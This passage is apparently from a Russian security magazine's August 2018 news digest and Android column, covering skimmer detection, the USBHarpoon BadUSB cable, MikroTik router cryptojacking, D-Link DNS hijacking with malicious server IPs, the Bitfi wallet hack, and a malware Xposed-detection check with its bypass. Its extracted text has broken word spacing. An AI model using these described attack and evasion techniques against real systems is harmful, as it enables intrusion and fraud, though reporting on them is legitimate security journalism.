  домили о случившемся пра воохранительные органы. Небезопас ность двух‐
  факторной аутентификации пос редством SMS в официальном заявлении
  прямо называют главной причиной произошедшего. Поэтому теперь сот‐
  рудники Reddit перейдут с SMS на использование 2FA‐токенов.


  РУКОВОДСТВО TRON FOUNDATION ПОДЕЛИЛОСЬ ПЛА ‐
 НАМИ
   Руководство компании TRON Foundation — организации, которая недавно приобрела BitTorrent,
    Inc., разрабатывающую популяр нейшие клиенты μTorrent и BitTorrent, — подели лось сво им
   видением перспектив дальнейшего развития этих проектов.





  →«В настоящее время мы рассматриваем возможность использования протоко ла TRON
   для улучшения протокола BitTorrent, чтобы тот стал быс трее и продлял срок жизни BitTorrent‐
   роев. Я надеюсь, что интеграция TRON и BitTorrent в будущем позволит обе им сторонам
   работать совместно и стать лучше. Интегрируя TRON и BitTorrent, мы хотим улучшить сущес тву‐
  ющий сейчас альтруизм. В нас тоящий момент у пиров [peer], которые завершили загрузку, нет
   стимулов продолжать сидировать [seed] контент. Мы намерены увеличить награду для пиров,
   которые сидируют тор ренты, вливая больше ресурсов в торрент‐эко сис тему. Сеть TRON будет
   протоколом, который ляжет в основу нашего секретно го проекта. Сотни мил лионов пользовате‐
   лей BT по всему миру станут частью экосис темы TRON. BT станет крупней шим приложением
   в сети TRON, что позволит TRON превзойти Ethereum по ежедневным транзакци ям и стать
   наиболее влиятельным блокчейном в мире»
  — Джастин Сан (Justin Sun), глава TRON Foundation





 ПОИСК СКИММЕРОВ
 И ОПАСНЫЕ КАБЕЛИ
  Среди наиболее интересных событий августа можно перечис лить не только
  новые уязвимости, техники атак, образчики малвари и масштабные взломы.
  Кое‐что интересное в этом месяце про демонстрировали и hardware‐хакеры.


  SkimReaper
  Сотрудник Флоридского университета Нолен Скейф (Nolen Scaife) предста‐
  вил на конферен ции USENIX Security Symposium устройство SkimReaper,
  которое способно обнаруживать многие типы скиммеров на банкоматах
  и PoS‐терминалах. Док лад удос тоился премии Distinguished Paper Award.
     Как рассказывают Скейф и его коллеги, их раз работка способ на обна‐
  руживать присутствие нескольких считывающих головок, а это верный сигнал
   того, что на машине установлен скиммер.
    В создании SkimReaper специалис там помогли сотрудники Департамента
  полиции Нью‐Йорка, предос тавившие экспертам доступ к раз личным ским‐
  мерам, с которыми пра воохранители регулярно стал киваются на практике.
  В итоге специалисты поделили скиммеры на четыре категории.
    Нак ладки: устрой ства, которые помещаются поверх слота для при ема
   карт в банкомате или PoS‐терминале. Могут быть созданы специально, чтобы
  соответствовать конкретной модели банкоматов, а порой перекрывают
  собой едва ли не все устройство. Как пра вило, вместе с такими накладками
   также можно обнаружить и наложенную поверх настоящей клавиатуру,
  которая используется для перехвата PIN‐кодов.





  Глу бокое внед рение: такие скиммеры размещаются глубоко в слотах
  для приема карт. Они дос таточно тонкие, чтобы поместиться под картой
  и успеть считать данные во время ее вставки или извлечения. Уже появились
  версии, способные пассивно считывать EMV‐транзакции; как правило, они
  размещаются между слотом для приема карт и EMV‐сенсором.
    Пе рехватчики:  такие приспособ ления  устанавливаются между  тер‐
  миналом и сетью, к которой тот подключен. Обычно уже то, что установка
   такого устройства возможна в принципе, свидетельствует о серьезных проб‐
  лемах с безопасностью.
    Внутренние скиммеры: такие скиммеры внедряются внутрь машины,
  между приемником карт и дру гим железом. По данным исследователей, чаще
  всего они встречаются на авто заправках, так как там легче всего добраться
  до внутренностей терминала, оставшись незамеченным.
    Скейф объясняет, что из вариаций скиммеров наиболее распространены
   накладки и глубоко внедренные устройства, обна ружить которые зачас тую
  бывает непросто. Как пра вило, правоохраните лям удается заметить компро‐
  метацию лишь тогда, ког да они целенаправленно ищут камеры, которы ми
  злоумышленники пользуются для перехвата PIN‐кодов.





      Все перечисленные способы уста новки скиммеров на одной схе ме

  По этой причине SkimReaper в первую очередь нацелен на поиск накладок
  и глубоко внедренных скиммеров. Он оснащен сенсором в форме банков‐
  ской карты, на котором рас полага ется печатная плата. Когда устройство
  вклю чено, оно спо соб но замечать небольшие скачки напряжения, которые
  возникают при вхождении в контакт с магнитны ми счи тывающими головками.
  Если их обнаруживается больше двух, значит, на терминале установлен ским‐
  мер.


                                        Продолжение статьи →
← Начало статьи





                               SkimReaper

  Исследователи из Флоридского универ ситета — не первые, кто работает
   в данном направле нии. К примеру, в прошлом году было представлено An‐
   droid‐приложение Skimmer Scanner, которое обна руживает скиммеры пос‐
  редством Bluetooth (похожими метода ми уже давно пользуются и предста‐
   вители правоохранительных органов).
     Но, по данным авторов SkimReaper, такой способ менее надежен, с его
  помощью им удалось обнаружить только 7 из 35 (20%) переданных им
  для тестов скиммеров. Дело в том, что такие устрой ства далеко не всегда
  поддерживают беспроводную связь. Тогда как, тес тируя SkimReaper на пре‐
  доставленных  полицией Нью‐Йорка  скиммерах,  исследователи  сумели
  добиться стопроцентной точности.
     После столь впечатляющих результатов Департамент полиции Нью‐Йорка
  принял SkimReaper «на воору жение» и уже обнаружил с его помощью
   как минимум одно мошенничес кое устройство. Еще семь полицейских
  управлений также заинтересовались при обретением SkimReaper — по приз‐
  нанию Скейфа, столько устройств раз работчики про извести пока не в силах.
  Очевидно, команду теперь придет ся расширять.


  USBHarpoon
  В августе 2014 года известные исследователи Карстен Нол (Karsten Nohl)
  и Якоб Лелл (Jakob Lell) из консалтинговой компании Security Research Labs
  сообщили о «фундаментальной уязвимос ти устройств USB», которая получи‐
  ла название BadUSB. В октябре того же года они опуб ликовали на GitHub код
  программы для взло ма компь ютера по USB. Фактически этот класс атак
  по сей день позволяет захватить контроль над многими устройствами,
   у которых есть порт USB. Ата кующий может эму лировать любую перифе рию,
   хотя чаще всего предпочтение отда ется клавиату рам.
    Но за последние годы пользователи, наученные горьким опытом, привык‐
  ли к тому, что доверять USB‐устройствам нуж но с оглядкой. К при меру, мно‐
   гие попросту не рискнут вставить в свою машину найденную на улице флешку,
  и это вполне разумно.
     Идея создать обычный USB‐кабель, эксплуати рующий BadUSB, возникла
  довольно давно. Ведь кабель явно вызовет у потенциальной жертвы меньше
  подозрений, чем периферия. Однако успешных попыток до недавнего вре‐
  мени практически не было.
     Для разработки USBHarpoon объединились специалис ты RFID Research
   Group, SYON Security и Кевин Митник (Kevin Mitnick), который и предложил
  исследователям эту идею. Сам Митник вдохновился работами исследова‐
   теля, известного в Twitter под ником MG. Еще в начале текущего года тот де‐
  монстрировал в своем микроблоге ата ку через USB‐кабель, однако связать‐
  ся с ним самим и обсудить сотрудничес тво Митник, к сожалению, не сумел.
    В итоге Митник привлек к раз работке специалистов упомяну тых выше ком‐
   паний, которые справились с задачей ничуть не хуже. В своем блоге Винсент
  Йю (Vincent Yiu) из компании SYON Security расска зал, что многие хакеры
  и специалисты пытались создать нечто похожее на USBHarpoon, однако у них
  все время что‐то не получалось. Но объединенной группе исследователей
  удалось решить все возникшие проб лемы и спроектировать работающий
  USB‐кабель, также являющийся HID‐совместимым устрой ством.
     USBHarpoon сработает на любой раз блокированной машине, к которой
  будет подсоединен. Пос ле подклю чения кабель выполнит ряд команд, заг‐
   рузит и запустит пейлоад. В Windows это делается напрямую через Run, а в
   случае с Linux и macOS может понадобиться запуск терминала. По умол‐
  чанию эта активность прекрасно видна на экране устройства, но, если нужно,
   атакующий может скрыть ее. В нас тоящее время предполагается, что атака
  будет производиться в отсутствие хозяина устрой ства.
     Автор оригинального исследования Карстен Нол напоминает, что проб‐
  лема BadUSB, по сути, не была устра нена и опасна по сей день. Защититься
   от подобных атак можно раз ве что с помощью спе циального защитного
  переходника (такие решения известны как USB‐презервативы, или USB con‐
  dom). Однако все тот же MG демонстрировал в сво ем Twitter атаку и на такой
  переходник, доказывая, что тот тоже может быть заражен, пос ле чего ему
  более нельзя доверять.
     К своему отчету о разработ ке USBHarpoon Винсент Йю приложил видео,
  на котором подключенный для заряд ки к Windows‐машине квадрокоптер
  передает устройству команды и занимается потенциально вредоносной
  деятельностью.





 ТОП ЯЗЫКОВ ПРОГРАММИРОВАНИЯ
   На страницах журнала IEEE Spectrum, издаваемого Институтом инже неров электро техники
   и электроники (IEEE), был опубликован традиционный рейтинг наибо лее популярных языков
   программирования.





   Python по‐прежнему занимает первую строчку рейтинга. В прошлом году он незначительно
   обошел по популярности C (100 против 99,7 балла), а в этом году C++ (100 про тив 99,7 бал‐
    ла).

   Второе и третье места в этом году заняли C++ (99,7) и Java (97,5), а один из прошлогодних
   лидеров, C, опустился на четвертую строку с 96,7 балла.





 РОУТЕРЫ ПОД
 АТАКОЙ
   Атак на IoT‐устройства становится все больше по мере роста количества
  самих гаджетов, подключенных к интернету вещей. Одной из самых частых
  целей преступников оказываются роутеры раз личных производите лей. Дело
   в том, что их много, они подключены к Сети, но зачастую защищены ничуть
  не лучше каких‐нибудь «умных» холодиль ников.


  Майнеры на MikroTik
  Сразу несколько ИБ‐специалис тов и компаний из раз ных стран зафиксирова‐
  ли волну атак, направленную против маршрутиза торов  MikroTik. Первым
  на происходящее обратил внимание бразильский иссле дователь, известный
  под ником MalwareHunterBR.
    Дело в том, что сначала ата ки концентрировались именно на территории
  Бразилии, но затем рас пространились и на дру гие страны, что привлекло
  внимание  экспертов   Trustwave.  По  данным  аналитиков  компании,
  по информации на 1 августа 2018 года неизвестные злоумышленники ском‐
  прометировали более 72 тысяч роутеров MikroTik в одной только Бразилии.
  На тот момент подоб ные ата ки практиковала всего одна хакерская группа, так
   как специалистам удалось выявить только один Coinhive‐ключ.





  Хакеры эксплуатируют свежую уязвимость, которая была обнаружена в сос‐
   таве компонента Winbox в апреле текущего года. Хотя инженеры MikroTik опе‐
  ративно устранили этот опас ный RCE‐баг, владельцы роутеров, к сожалению,
  по‐прежнему не спешат устанавливать обновление на свои устройства. Меж‐
   ду тем в Сети уже были опуб ликованы PoC‐экс плоиты и детальные анализы
   бага.
     После взлома устройства используются для манипуляций с трафиком:
  роутеры заставляют внедрять во все страницы всех сайтов майнинговый
   скрипт Coinhive. Хуже того, по данным экспертов, атаки коснулись не только
  пользователей MikroTik. Дело в том, что некоторые бразильские провайдеры
  используют уязвимые маршру тиза торы в сво их основных сетях, и в резуль‐
   тате их компрометации инъекции Coinhive затронули большой процент тра‐
  фика. Такие инъекции опасны не только для поль зовате лей напрямую. К при‐
   меру, если некий сайт размещается в локальной сети за роутером MikroTik,
  его трафик также окажет ся заражен майнером Coinhive.
    Но злоумышленники быстро поняли, что встра ивать май нер буквально
  повсюду — не слишком хорошая идея, так как подобное поведе ние привлека‐
   ет чересчур много внимания. Тогда операто ры вредоносной кампании
  решили ограничиться только страница ми оши бок, которые возвращают
  роутеры. При этом массовость атак не снижается. Пос ле того как кампания
  распространилась за пределы Бразилии, количес тво зараженных Coinhive
  роутеров превысило 180 тысяч.
     Простое обращение к поисковику Shodan показывает, что в интернете
  можно обнаружить более 1,7 миллиона роутеров компании MikroTik, то есть
   атакующим опре делен но есть где развернуть ся.
    По данным известного ИБ‐эксперта Троя Мурша (Troy Mursch), специалис‐
  там удалось выявить второй ключ Coinhive, внедряемый в трафик устройств
   MikroTik. Вторая вредонос ная кампания затронула по меньшей мере 25 тысяч
  роутеров, то есть в общей сложности уже были скомпрометированы свы‐
  ше 200 тысяч устрой ств.


  Брешь в девайсах D-Link
  Эксперты Radware обнаружили еще одну атаку, нацеленную на бразильских
  пользователей. Зло умышленники используют уяз вимость части устройств D‐
   Link для изменения настро ек DNS и перенаправления бразильских поль‐
  зователей, которые пытаются посетить сайты банков, на сайты‐фальшивки.
  Такие фейковые ресурсы, разумеется, созданы для хищения учетных, финан‐
  совых и личных данных: номера телефона, PIN‐кода карты, номера CABB и так
   далее.
    Подделки существуют для ресурсов как минимум двух банков: Banco de
   Brasil  (www.bb.com.br) и Unibanco  (www.itau.com.br). Вредонос ные DNS,
  задействованные в атаках, — это 69.162.89.185 и 198.50.222.136.
    По данным исследователей, проблема, позволя ющая неавторизованным
  лицам  удаленно  изменить  настройки  DNS,  представляет  опасность
  для модемов и роутеров D‐Link DSL‐2740R, DSL‐2640B, DSL‐2780B, DSL‐
  2730B и DSL‐526B.





                           Хронология атак

  Первые попытки использования экс пло итов против DSL‐роутеров D‐Link были
  зафиксированы еще в начале июня 2018 года. Так, между началом июня
  и  серединой   августа   текущего   года  Radware   удалось   выявить
  более 500 попыток эксплуатации проб лемы. При этом специалисты отме‐
   чают, что эксплоиты для мно гих роутеров (в основном производства D‐Link)
  были опубликованы еще в 2015 году.
    Специалисты предупреждают, что в случае такой атаки распознать под‐
  дельный сайт гораздо труднее, чем обычно. Ведь преступники не изменяют
  URL, не рассылают фишин говых писем и не прибега ют к дру гим известным
  уловкам. Фактически единс твенное, что выда ет атаку, — это незащищенное
  соединение (HTTP) или проб лемы с сертифика том, если жертва пытается
  использовать HTTPS.
    В настоящее время предста вители Radware уже поставили в извес тность
  о происходящем предста вителей банков и облачного хостинга, где раз‐
  мещались DNS‐серверы, и фиктивные сайты прекратили работу. Пользовате‐
  лям потенциально уязвимых устройств нас тоятельно рекомендуют проверить
  настройки DNS и озаботиться установкой патчей.


 ЛИШЬ 36 КРИПТОВАЛЮТНЫХ ПРОЕКТОВ ИЗ 100 ИМЕЮТ
 ГОТОВЫЙ ПРОДУКТ

   Специалисты портала Invest in Blockchain провели собс твенное иссле дование, изучив 100
   самых крупных по капитализации крип товалютных проектов. Как оказалось, только 36 из них
   имеют работающие продукты и хоть как‐то используются.


  В пятерке лидеров в итоге оказались следующие «небесполезные» проекты: Bitcoin, Ethereum,
    Ripple, Bitcoin Cash и Stellar Lumens. Вмес те с тем в список не вошли такие проекты, как TRON,
   IOTA и Cardano, а крип товалюты OmiseGO и Verge хотели включить в перечень, но все же иссле‐
   дователи сочли, что пока те не соответствуют предъ явленным критериям.





 НЕВЗЛАМЫВАЕМЫЙ
 BITFI
  В начале августа 2018 года Джон Макафи предложил всем желающим поп‐
  робовать хакнуть криптовалютный кошелек Bitﬁ, называя устройство «невзла‐
  мываемым» и предлагая 250 тысяч долларов любому, кто сумеет доказать
  обратное.
    В ответ ИБ‐сооб щество раскритико вало Макафи за то, что тот поставил
  очень странные «усло вия задачи», из‐за которых до сих пор может утвер‐
   ждать, что Bitﬁ не взломали. Так, исследователям предлагается приобрести
  кошелек за 120 дол ларов, он уже содержит криптовалюту и защищен неиз‐
  вестной парольной фразой. Требуется извлечь токены из кошелька, и лишь
   тогда оно будет считаться взломанным. При этом ключ, использующийся
  для доступа к криптовалюте, не хра нится на самом устройстве.
      Так, известный исследова тель Эндрю Тирни (Andrew Tierney) писал, что
  предложенная специалистам схема покрыва ет только один метод  атак:
  хищение средств с украденного устройства  Bitﬁ, которое уже оказалось
   в руках хакеров. Однако в реальнос ти только этим сценарием дело, конечно,
  не  ограничивается. К примеру, прес тупники  могут  организовать  атаку
  на цепочку поставок и модифицировать кошель ки, чтобы те запоминали
  и пересылали все клю чи третьей стороне. Также в устройства могут встроить
  бэкдор, однако подобные сценарии атак не были включены в bug bounty Джо‐
  на Макафи, а устрой ство упорно продолжают называть «невзламываемым».
    В свою оче редь, эксперты Pen Test Partners выяснили, что «невзламыва‐
  емое» устройство представляет собой смартфон на Android, из которого
  были удалены отдельные компоненты (в основном отвечающие непос редс‐
   твенно за сотовую связь). Специалистам уда лось получить к девайсу root‐
  доступ и обнаружить, что тачскрин сооб щается с чипсетом посредством
  незашифрованного протокола I2C. То есть в теории злоумышленники могут
  «прослушивать» эти коммуника ции и извлечь пароль ную фразу сразу же пос‐
  ле того, как она была набрана на экране. Хуже того, кошельки оказались
  практически никак не защищены от несанкциони рованного вмешательства.
  То есть Bitﬁ можно вскрыть и исследовать, а он продолжит работать как ни
   в чем не бывало.
     Позже специалисту, известному под ником Abe Snowman, удалось запус‐
   тить на устройстве Doom. СМИ сооб щают, что за этим псевдонимом скры‐
   вается 15‐летний исследователь Салим Рашид (Saleem Rashid).
    И хотя Doom на Bitﬁ может показаться кому‐то пустяком, исследователь
  объясняет,  что для запуска игры на кошельке необходимо  установить
  и выпол нить про извольный код, а также реализовать чте ние и запись из хра‐
  нилища и RAM, запись в кадровый буфер и чтение данных с тачскрина.
     Невзирая на все перечис ленное, Джон Макафи продолжает утверждать,
   что устройства Bitﬁ надежны и ни одному хакеру так и не удалось выполнить
  поставленные усло вия и похитить из кошель ка токены. Хотя в интервью
  ресурсу Eth News Макафи признался, что «воз можно, называть Bitﬁ невзла‐
  мываемым было неразумно», он по‐прежнему убежден, что кошелек не может
  считаться взломанным, подчеркивая, что под «взломом» подразуме вается
  именно хищение токенов и ничего более.



        «Хакеры очень внимательны к деталям. Говоря „хак“, я под разуме ваю
         кра жу коинов. Зачем вообще ломать кошелек, если не для хищения
         коинов? И пользовате ли волнуются: „могут ли хакеры украсть мои
         коины?“. Ответ — нет», — говорит Макафи.


  ЗАРАБОТАТЬ НА COINHIVE НЕ ТАК ПРОСТО
   Эксперты из Рейнско‐Вестфальского технического университета Ахена изучили работу майнин‐
   гового сервиса Coinhive и подсчитали доходы его клиентов.

  В месяц Coinhive добыва ет Monero на 250 000 дол ларов США. Опе раторы Coinhive оставляют
   себе 30% добытого, а остальное получают клиенты сервиса.

   Хотя, помимо Coinhive, существуют и другие аналогичные сервисы, он удерживает пальму пер‐
   венства с большим отрывом.





   Согласно отчету, майнинговые скрипты были обнаружены толь ко на 0,8% сайтов.

   Наиболее активными распространителями Coinhive выступают все го 10 клиентов сервиса,
   которые и получают от своей деятельности наибольшую прибыль.

   Почти треть всех ссылок создана одним и тем же пользователем, а примерно 85% всех ссылок
   созданы всего 10 людьми.





 КОНЕЦ EMUPARADISE
  Еще в прошлом месяце компания Nintendo начала юри дически бороться
  с сайтами, распространяющими ROM’ы ста рых игр. Тогда пред ставите ли
  компании обратились в федеральный суд Аризоны с жалобой на ресурсы
  LoveROMS.com и LoveRETRO.co, обвинив их в нарушении авторских прав
  и незаконном исполь зовании торговых марок. В заявлении сказано, что эти
  сайты — одни из самых известных источни ков игрового пиратства в онлайне.
  В настоящее время оба ресурса уже ушли в офлайн и вряд ли когда‐либо
  вернутся.
    Лю бители ретроигр были крайне огорчены происходящим, а теперь вслед
  за LoveROMS.com и LoveRETRO.co о решении прекратить распространять
   старые игры объявил и известный сайт EmuParadise.
    Основатель ресурса, MasJ, сообщил, что ска чать старые ROM’ы с EmuPar‐
   adise больше будет нельзя. Он пишет, что сайт прошел долгий путь за 18 лет
  своего существования и его администрация успела повидать вся кое:



         «От писем с угрозами, которые присыла ли нам на заре работы,
        до вне зап ного отклю чения хос тингов и наших сер веров из‑за жалоб.
      Мы повида ли все. Мы всегда под чинялись тре бова ниям уда ления кон-
          тента, но, как видите, это уже ничего не гарантиру ет».

  И хотя правообладатели называют подоб ные ресурсы рас садниками пиратс‐
   тва, на деле многие из них давно заб рошены и почти забыты. Более того,
  зачастую у ностальгирующих пользователей попросту нет других легальных
  альтернатив, так как оригинальные железо и картриджи дос тать порой поп‐
   росту невозможно и оста ются лишь эмуляторы и пиратские сайты.



       «Мы  получа ли  тысячи  писем  от  людей,  которые  рас ска зыва ли,
          как счас тливы они были снова открыть для себя игры своего детс тва
        и поделиться ими с новыми поколе ниями своих семей. Нам писали
         солдаты из горячих точек и рас ска зыва ли, что ретроигры, в которые
        они игра ли в детс тве, — это единс твенное, что помогло им пройти
         через эти сложные дни. Нам писали люди, чьи братья скончались
         от рака, и они наш ли уте шение в играх, в которые игра ли вмес те
         в детс тве. У нас было бес счетное чис ло таких историй», — пишет
         MasJ.

  MasJ с сожалением признает, что он не готов и далее поддерживать рас‐
  пространение ROM’ов и рисковать будущим своей команды и посетителей.
  Тем не менее сообщается, что EmuParadise не закрывается: сайт продол жит
  работу и по‐прежнему будет пос вящен ретроиграм. В какой именно форме
   это будет реализовано, пока неяс но.
     Увы, происходящее предска зывали уже давно. Так, еще в 2016 году осно‐
   ватель Video Game History Foundation Фрэнк Сифал ди (Frank Cifaldi) выступал
  на Game Developers Conference, и еще тогда он предупреждал:



       «Мы демонизиру ем эму ляцию и обес ценива ем собс твенное нас ледие.
      Мы низ водим до пиратс тва огромную часть нашего прош лого».


  ЗА 335 ЕВРО В GOOGLE PLAY ПРОДАВАЛИ ЛОГОТИП
  ETHEREUM
   Сотрудник компании ESET Лукас Стефан ко (Lukas Stefanko) обнаружил в Google Play приложе‐
   ние Ethereum, которое якобы позволяло пользователям приобрести 1 Ether, если те покупали
   само приложение, чья цена составляла 334,99 евро (нужно заметить, что эфир сейчас сто ит
   почти на 100 евро дешевле).


   На самом деле под видом крип товалюты мошенники продавали приложение с бес полезной
   картинкой (логотипом Ethereum) и без какой‐либо полезной функциональнос ти. К тому же
   от лица компании Google Commerce Ltd.

   На момент обнаружения у приложения нас читывалось более 100 загрузок, то есть его купили
   как минимум 100 человек.

 ДРУГИЕ ИНТЕРЕСНЫЕ
 СОБЫТИЯ МЕСЯЦА
   • В даркне те начали продавать малварь для криптовалютных банкоматов
   • Компания Crowdfense запускает собственную платформу для покупки уяз‐
     вимостей
   • Сети организаций могут быть скомпро метированы через... факсы
   • Три новые уязвимости клас са Spectre выявлены в процес сорах Intel
   • Миллионам приложений для Android угрожает проблема Man‐in‐the‐Disk
   • Обнаружена новая разновидность Mirai, использующая Aboriginal Linux
     и опасная для Android и Debian
   • Уязвимости в кардиостимуляторах и инсу линовых помпах MedTronic могут
     угрожать жизням их вла дельцев
   • У биткойн‐инвестора «угна ли» SIM‐карту и похитили 23 миллиона дол‐
     ларов
   • Разработчики Telegram не собираются сотрудничать с российски ми спец‐
     службами
   • Некоторым участникам хакерской конференции DEF CON пришлось иметь
     дело с полицией
HEADER

   ANDROID

          КАК GOOGLE СЛЕДИТ ЗА ТОБОЙ,
          НОВАЯ АТАКА MAN‐IN‐THE‐DISK
                 И РЕВЕРС ВИРУСОВ





                                                                              Евгений Зобнин
                                                                                     Редактор Unixoid и Mobile
                                                                                                  zobnin@glc.ru





В этом выпус ке: Google следит за тобой, новый вектор атак
на мобильные устройства, реверс зашифрован ных вирусов,
анализ исходного кода Android на уязвимости и 47 уязвимос‐
тей в Android‐устройствах. А также: лучшие онлайн‐инстру‐
менты раз работчика Android, скрытые возможности Kotlin
и свежие библиотеки для программистов.



ИНСТРУМЕНТЫ


 • ARTist — DBI‐фреймворк, подоб ный  Frida, но использующий намного
   более интересный метод модификации приложе ния: подмену ском‐
   пилированного на устройстве OAT‐файла приложения на другой; более
   подробно описан в документе, опуб ликованном на сайте Black Hat;
 • House — оче редная обертка вокруг Frida для новичков;
 • jelbrekTime — джейлбрейк для Apple watch S3 watchOS 4.1;
 • Sirius Obfuscator — обфуска тор исходно го кода на языке Swift.



ПОЧИТАТЬ


Google сле дит за тобой
Google Data Collection — доклад исследова телей из уни верситета Ван‐
дербильта, посвящен ный сервисам компании Google, а точнее тому, как ком‐
пания использует эти сервисы для сбора информации о пользователях.
Общий вывод таков, что от Google не скрыться при всех стараниях, а конкрет‐
ные данные следующие:
 • смартфон Android в спящем режиме с активиро ванным браузе ром Google
   Chrome передает информацию о местоположении 340 раз в  сутки.
  В целом смартфон с установленным Chrome отправляет данные в 50 раз
   чаще, чем iOS с Safari;
 • неактивное Android‐устройство взаимодействует с Google почти в десять
   раз чаще, чем устрой ство Apple взаимодействует с серверами Apple;
 • используя рекламные сети, Google может связать анонимные данные
   с личной информацией пользователя; например, если искать информа‐
   цию через Google, используя браузер Firefox, Google может определить,
   что тот, кто ищет, — владелец такого‐то телефона;
 • большую часть данных Google собира ет в то время, когда пользователь
   не взаимодействует нап рямую с каким‐либо из продуктов Google.





         Количество данных, отправленных Android и iOS в сутки


«Новый» век тор атак: Man-in-the-Disk
Man‐in‐the‐Disk: A New Attack Surface for Android Apps — так называемый
новый вектор атак на приложения для Android от компании Check Point. Суть
в том, что в Android внешний накопитель, а именно карта памяти (даже если
она внутренняя), использует файловую систему без разделения прав доступа,
а значит, если одно из приложений сохранит что‐то на карту памяти, любое
другое приложе ние сможет это что‐то про читать и/или изменить.
   Атака как раз и заключается в том, что злоумышленник создает при ложе‐
ние, которое затирает или подменя ет чужие файлы. Например, можно выз‐
вать сбой в Google Translate, Yandex Translate, Google Voice Typing и Google
Text‐to‐Speech. Но, что более интерес но, в некото рых случаях можно под‐
менить установленное приложение затрояненным вариантом. Например,
если приложение сох раня ет файл своего обновления на карту памяти, дос‐
таточно подменить его, и в качес тве обновления будет установлено совсем
не то, что нужно. Так, например, можно сделать с Xiaomi Browser.
   Стоит отметить, что это вовсе не новый вектор атак. Об этой проблеме
известно с первых версий Android, поэтому Google всегда призывала раз‐
работчиков рассматривать карту памяти как склад бес полезного хлама и не
хранить на ней ничего важного. Да, ее собственный Google Translate падает
при удалении кеша, но что важнее — раз грузить внутреннюю память смар‐
тфона или защититься от каких‐то непонятных людей, которые захотят уро‐
нить твой Google Translate?


47 уяз вимостей в устройствах Android
DEF CON 2018: Vulnerable Out of the Box — An Evaluation of Android Carrier De‐
vices — исследование компании Kryptowire, пос вященное поис ку уяз вимос тей
в Android‐устройствах раз личных производителей: Alcatel, ASUS, LG, ZTE,
Sony, Nokia, Orbic, Oppo, MXQ и других.
   Итог: в общей сложности найдено 47 уязвимостей, включая крах прошив‐
ки, очистку всех данных пользователя, скры тое создание скриншотов и скрин‐
кастов, получение root, незаметную установку приложений, скрытую отправку
SMS и доступ к адресной книге.
   Стоит отметить, что все эти уязвимос ти отсутс твуют в чистом Android (том,
что установлен на Google Pixel или Essential, например) и выявлены в модифи‐
цированных производителем частях прошивки и драйверах.


Как реверсят вирусы
Unpacking the Packed Unpacker — интересная презентация девушки из коман‐
ды Android Security Team и по совместительству разработчика IDAPython
о том, как отревер сить приложение, запакованное зашифрованным пакером.
   Главный инте рес здесь, конечно же, не в уникаль ности материала, а в его
подаче. Несмотря на то что это не статья и не вайтпей пер, а всего лишь
набор слайдов, он легко читается и полностью вводит в курс дела: зачем нуж‐
ны нативные библиотеки, как они используются в приложении, что такое фор‐
мат JNI, как определить, что биб лиотека зашифрована (отсутствие JNI‐фун‐
кций и повторяющийся луп в начале), как сделать дешиф ратор (самый прос‐
той вариант: переписать ассемблерный код на Python и использовать
IDAPython, чтобы дешифровать код), как вирусы проверяют, что находятся
в эмулируемой среде, и как эту проверку обойти.
   Например, про верка на запуск приложения под управлением Xposed дела‐
ется так:
 1. Поиск LIBXPOSED_ART.SO и XPOSEDBRIDGE.JAR в файле /proc/self/
   maps (этот файл показывает все отоб раженные в текущий процесс файлы,
   в том числе библиотеки).
 2. Поиск любого из двух методов de/robv/android/xposed/XC_Method
   Hook,  de/robv/android/xposed/XposedBridge  с  помощью  JNI‐
   метода FindClass().





              Как вирусы выполняют проверку на процессор


Анализ исходно го кода Android
Проверили с помощью PVS‐Studio исходные коды Android, или Никто не иде‐
ален — статья разработчиков ста тичес кого ана лиза тора PVS‐Studio о про‐
верке исходных текстов Android на наличие ошибок. Результат достаточно
ожидаем для такого объема кода.
 • Бессмысленные сравнения:


   pr2.mStretchMode == pr2.mStretchMode
   ns != 1 || ns !=1

 • Разыменование нулево го указателя:


   if (xmlProxyLib == nullptr) {
       ALOGE("effectProxy must contain a <%s>: %s",
           tag, dump(*xmlProxyLib));
       return false;
   }

 • Приватные данные не затираются в памяти. Это уже более сложная ошиб‐
    ка, когда программист все делает правиль но, затирая память нулями
   в конце работы с важными данными, но не учи тывает того факта, что ком‐
   пилятор, скорее всего, удалит операцию запол нения памяти нулями,
   как бессмысленную. Например, в этом случае компилятор, вероятнее все‐
    го, удалит обращение к функции memset:


   static void FwdLockGlue_InitializeRoundKeys() {
       unsigned char keyEncryptionKey[KEY_SIZE];
       ...
       memset(keyEncryptionKey, 0, KEY_SIZE); // Zero out key data.
   }

 • Не учитывается порядок вычисления аргу ментов. Еще один пример нез‐
   нания работы компилято ра, который может считать аргументы функции
   в произвольном порядке. В следующем примере функции readSigned
   будут вызваны в неопределенной пос ледова тельности:


   mHal.setLayerCursorPosition(...., readSigned(), readSigned());

А также:
 • игнорирование результатов исполнения функции;
 • код, который никогда не выполняется;
 • забытый break внутри switch;
 • возврат уже не существующих данных;
 • выход за границу массива;
 • повторное присваивание переменной и другое.

Автор исследования утверждает, что PVS‐Studio выявил более чем одну
потенциальную уязвимость на 4000 строк кода. Однако стоит иметь в виду,
что речь именно о потенциальных уяз вимостях, в число которых входят, нап‐
ример, всегда истинные или всегда ложные условия. Другими словами,
это просто места, на которые программистам стоит обратить внимание.



РАЗРАБОТЧИКУ

Он лайн‑инстру мен ты раз работчика Android
Awesome List Of Online Tools For Android Developers — список онлайн‐инстру‐
ментов, которые пригодятся любому Android‐раз работчику.
   Дизайн:
 • Три инструмента: Figma, InvisionApp, Zeplin.

Разработка:
 • AndroidStarters — соз дает Android‐проект на базе выб ранной архитектуры
   в три клика;
 • MaterialPalette — генера тор цветовой палитры на базе Material Design;
 • Android Asset Studio — инс трумент для быс трой генерации иконок;
 • Android SDK  search —  расширение Chrome  для быстрого  поиска
   по документации Android SDK;
 • Gradle, please — вводишь наз вание биб лиотеки, получаешь строчку
   для вставки в build.gradle;
 • Kotlin extensions — список самых полезных функций‐расширений Kotlin;
 • JsonStub — фейковый бэкенд, способный генерировать любые запросы
   и ответы JSON.

Тестирование и внедрение:
 • APK method count — инс трумент для подсчета количества методов в при‐
   ложении, чтобы убе диться, что не пересекаешь лимит в 65K методов;
 • Appetize — инструмент для запус ка приложений в браузере;
 • Appstore screenshot generator — генератор скриншотов с рамкой смар‐
   тфона для Play Store;
 • App Launch Pad — похожий инс трумент с более интерес ными вариантами
   оформления.

Продуктивность:
 • Android arsenal — список лучших инс трументов и библиотек с каталогиза‐
   тором и поиском;
 • Mindorks App Store — еще один подоб ный каталог;
 • Octotree — расширение Chrome для быстрой навигации по GitHub;
 • RegExr — мощный инстру мент для работы с регулярными выражениями.





                         App Launch Pad


